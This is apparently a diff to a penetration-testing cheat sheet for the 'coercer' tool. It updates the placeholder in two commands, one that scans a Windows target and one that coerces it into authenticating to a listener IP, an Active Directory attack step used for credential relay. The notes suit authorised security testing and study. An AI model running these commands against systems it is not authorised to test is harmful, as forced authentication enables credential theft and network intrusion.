@@ -6,10 +6,10 @@
 
 ## scan
 ```
-sudo coercer scan -u <user> -p '<password>' -d <domain> -t <target-ip> 
+sudo coercer scan -u <user> -p '<password>' -d <domain_fqdn> -t <target-ip> 
 ```
 
 ## coerce
 ```
-sudo coercer coerce -u <user> -p '<password>' -d <domain> -l <listen_ip> -t <target-ip> -v --always-continue 
+sudo coercer coerce -u <user> -p '<password>' -d <domain_fqdn> -l <listen_ip> -t <target-ip> -v --always-continue 
 ```
